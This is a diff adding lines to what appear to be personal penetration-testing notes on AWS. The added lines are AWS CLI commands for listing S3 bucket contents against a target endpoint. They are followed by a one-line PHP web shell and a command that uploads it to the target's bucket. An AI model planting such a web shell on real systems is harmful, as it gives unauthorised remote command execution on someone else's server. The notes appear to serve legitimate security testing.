@@ -9,6 +9,16 @@ AWS GuardDuty for security.
 Tools      
 
     https://aws.amazon.com/cli/   #AWS CLI    
+   
+    aws configure     #set up, can put temp in all values   
+    aws s3 ls bucket.site.com    #list contents of a bucket    
+    aws --endpoint=http://s3.site.com s3 ls      
+    aws --endpoint=http://s3.site.com s3 ls s3://site.com   #list objects and common prefixes   
+  
+   # might be able to upload a php web shell
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com    
+
     
 Resources      
 
